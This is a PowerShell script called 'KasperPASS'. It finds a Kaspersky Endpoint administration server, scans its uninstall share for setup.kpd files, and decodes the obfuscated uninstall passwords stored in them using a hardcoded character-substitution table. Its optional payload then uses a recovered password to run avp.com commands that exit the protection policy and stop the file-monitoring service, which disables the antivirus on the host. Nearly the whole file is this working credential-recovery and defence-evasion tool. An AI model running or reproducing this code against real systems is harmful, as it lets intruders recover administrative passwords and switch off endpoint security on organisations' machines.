<#
.Synopsis

Author: Vito De Laurentis (AKA Trust_No_1) (@Trust_No_001)
License: GNU GPL v2
Version: v1.0

.Example

Default is to decript Setup.kpd password
.\KasperPASS


#>
Param (
            [string]$Payload = "$null",
            $server = "$null",
            [string]$username = $null,
            $password = "$null"
            
       )


    
#####################################################################
#####################################################################
#     Function that decodes and decrypts password
 
 function Decrypt-Password {
        Param (
            [string] $KUpassword 
              ) 
               $Mat = '83/@ç82/Aç81/Bç80/Cç8F/Lç8E/Mç8D/Nç8C/Oç8B/Hç8A/Iç89/Jç88/Kç87/Dç86/Eç85/Fç84/Gç93/Pç92/Qç91/Rç90/Sç9F/\ç9E/]ç9D/^ç9C/_ç9B/Xç9A/Yç99/Zç98/[ç97/Tç96/Uç95/Vç94/WçA3/`çA2/açA1/bçA0/cçAF/lçAE/mçAD/nçAC/oçAB/hçAA/içA9/jçA8/kçA7/dçA6/eçA5/fçA4/gçB3/pçB2/qçB1/rçB0/sçBF/|çBE/}çBD/~çBC/*çBB/xçBA/yçB9/zçB8/{çB7/tçB6/uçB5/vçB4/wçE3/ çE2/!çE1/"çE0/#çEF/,çEE/-çED/.çEC//çEB/(çEA/)çE9/*çE8/+çE7/$çE6/%çE5/&çE4/*çF3/0çF2/1çF1/2çF0/3çFF/<çFE/=çFD/>çFC/?çFB/8çFA/9çF9/:çF8/;çF7/4çF6/5çF5/6çF4/7' 
               #$Mat =  '83/@,82/A,81/B,80/C,8F/L,8E/M,8D/N,8C/O,8B/H,8A/I,89/J,88/K,87/D,86/E,85/F,84/G,93/P,92/Q,91/R,90/S,9F/\,9E/],9D/^,9C/_,9B/X,9A/Y,99/Z,98/[,97/T,96/U,95/V,94/W,A3/`,A2/a,A1/b,A0/c,AF/l,AE/m,AD/n,AC/o,AB/h,AA/i,A9/j,A8/k,A7/d,A6/e,A5/f,A4/g,B3/p,B2/q,B1/r,B0/s,BF/|,BE/},BD/~,BC/⌂,BB/x,BA/y,B9/z,B8/{,B7/t,B6/u,B5/v,B4/w,E3/ ,E2/!,E1/",E0/#,EF/*,EE/-,ED/.,EC//,EB/(,EA/),E9/*,E8/+,E7/$,E6/%,E5/&,E4/'',F3/0,F2/1,F1/2,F0/3,FF/<,FE/=,FD/>,FC/?,FB/8,FA/9,F9/:,F8/;,F7/4,F6/5,F5/6,F4/7' 
               $separator = "54";$KU2password = $KUpassword -split $separator;$pw= ""
               $Mat = $Mat.Split("ç")
               #$Mat = $Mat.Split(",")
	           foreach ($ku2 in $KU2password)
		        {
		         foreach ($ma2 in $mat)
		          {
		           $ma3 = $ma2.Split("/");$ma4 = $ma3[0]
		           If ($ku2 -eq $ma4) {$pw= $pw + $ma3[1]}
		          }
		        }
Write-host -foregroundcolor green "`n[*] DECRYPTING PASSWORD"
 
return [array]$pw               
}

#####################################################################
#####################################################################


Write-Host ""
Write-Host "    ╔----------------------- KasperPASS ------------------------╗"
Write-Host "    ║  Find Kaspersky Endpoint passwords from setup.kpd file    ║"
Write-Host "    ║                                                           ║"
Write-Host "    ║  ON-Line Version                                          ║"
Write-Host "    ║  Author:  Vito De Laurentis (@Trust_No_1)                 ║"
Write-Host "    ║  Credits: Guglielmo Scaiola (@S0ftwarGs )                 ║"
Write-Host "    ║  Email:  delaurentis@live.it                              ║"
Write-Host "    ║  Version: v1.1 ()                                         ║"
Write-Host "    ║  Website: --                                              ║"
Write-Host "    ║  New options: -server [ip]; -payload y                    ║"
Write-Host "    ║                                                           ║"
Write-Host "    ╚-----------------------------------------------------------╝"
Write-Host ""
#####
Start-Sleep -s 5
 

 
$lpath = Get-Location
if ($server -ne "")
    {
    write-host "no domain"
    $path = "\klshare\Uninstall"
    $ppath = "\\"
    $AdmServer = $ppath + $Server + $path
    $Credential = New-Object System.Management.Automation.PSCredential -argumentlist $username, $password
    start "$AdmServer" -Credential $Credential
     }
else
    {
write-host "domain"
$ProtectionAdmServer = (get-itemproperty 'HKLM:SOFTWARE\Wow6432Node\KasperskyLab\Components\34\1103\1.0.0.0\Statistics\AVState').Protection_AdmServer;
$path = "\klshare\Uninstall"
$ppath = "\\"
$AdmServer = $ppath + $ProtectionAdmServer + $path
Write-host -fore green "`n[+] Found $AdmServer Key Registry"
    }                                                                  
                                                  
$DCaccessible = @()
$ConnClient = New-Object System.Net.Sockets.TCPClient
$Access13000 = $ConnClient.BeginConnect($ProtectionAdmServer,13000,$null,$null)
$Waitfor = $Access13000.AsyncWaitHandle.WaitOne("200",$False)

if ($ConnClient.Connected){
                            Write-host -fore green "`n[+] Kaspersky Server $ProtectionAdmServer is accessible"
                            $DCaccessible += $ProtectionAdmServer
                            $Null = $ConnClient.Close()
                          }
                else 
                          {
                            Write-host -fore red "`n[+] error Kaspersky Server $ProtectionAdmServer Network error."
                          }
                          
                                                 
Write-Host -foregroundcolor green "`n[+] Scanning  $AdmServer "
$KPDFiles = Get-ChildItem -Path "$AdmServer" -recurse -filter *.kpd
if ($KPDFiles -ne $null)
{
                        [int] $filecount = $KPDFiles.Count
                        $pcount = 0
                        Write-host -foregroundcolor green "`n[info] Found $filecount KPD files of interest in $ProtectionAdmServer" 
                        
                        foreach($KPDs in $KPDFiles)
                        
                          {
                        
                        $uninstalldata = ""
                        $Filename = $KPDs.Name
                        $FPath = $KPDs.VersionInfo.Filename
                        #Write-host -foregroundcolor green "`n[info] $fpath" 
                        
                         switch ($Filename){
                                       "setup.kpd"{
                                                  foreach($Line in gc $FPath){
                                                                                       
                                                  if($line -match "uninstalldata") {
                                                                                    
                                                                                    Write-host -foregroundcolor green "`n[info] $fpath"
                                                                                    $pcount = $pcount + 1 
                                                                                    $null, $KUpassword = $line.Split("=")
                                                                                    Write-host -foregroundcolor red "[+] Found $pcount encrypted $KUpassword"
                                                                                                                                                                        
                                                                                    [array]$pwo = $pwo + (Decrypt-Password $KUpassword)
                                                                                    #[array] $pwarray = Decrypt-Password $KUpassword
                                                                                    $pcount2 = $pcount - 1
                                                                                    $stampa_pw = $pwo[$pcount2]                                          
                                                                                    Write-host -foregroundcolor red "[$pcount] $stampa_pw "                                                
                                                                                    
                                                                                    } 
                                                                              }                       
                                                    
                                                  }
                                             }
                          }

}                     


set-location -path $lpath
if($payload -eq "y"){
                        if ($pwo.count -gt 0 ) 
                              {
                               $numberpass = Read-Host -prompt "Enter your password number [Es: 4]:"
                               write-host "`n[+] Select $numberpass Password"
                               $numberpass2 = $numberpass - 1
                              }
                        write-host "`n[+] Payload execution ..."
                        
                        $pat = "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Endpoint Security 10 for Windows\"
                        
                        Set-Location -path $pat
                        Push-Location -path $pat
                        cd "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Endpoint Security 10 for Windows\"
                              $pws = $pwo[$numberpass2]
                        write-host "`n[+] $pws "
                        Start-Sleep -s 5
                        write-host "`n[+] Execute AV ExitPolicy "
                        Start-Sleep -s 5
                        start avp.com "exitpolicy password=$pws"
                        write-host "`n[+] Stop AV Service "
                        Start-Sleep -s 5
                        start avp.com "stop FM password=$pws"
                        Set-Location -path $lpath
                    }                  
exit
